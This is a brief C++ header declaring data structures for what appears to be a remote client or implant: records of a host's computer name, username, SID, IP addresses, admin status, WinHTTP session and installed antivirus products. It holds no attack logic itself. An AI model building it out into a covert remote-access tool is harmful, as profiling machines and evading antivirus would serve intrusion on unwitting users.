#pragma once
#include <string>
#include <iostream>
#include <windows.h>
#include <winhttp.h>
#include <vector>
#include "Encryptions.h"

using namespace std;
#pragma comment(lib, "Winhttp")



class PublicStructers
{
public:
	struct client
	{
		string computer;
		string username;
		string OS;
		string isA;
		string clientId;
		string sID;
		string globalIp;
		vector<string> IPv4;
		bool ifWifi;
		HINTERNET session;
		vector<string> listAvs;
	};

	struct ClientSession {
		string clientId;
		HINTERNET session;
	};

	struct Network {
		string macAddress;
		LONG signal;
	};
};

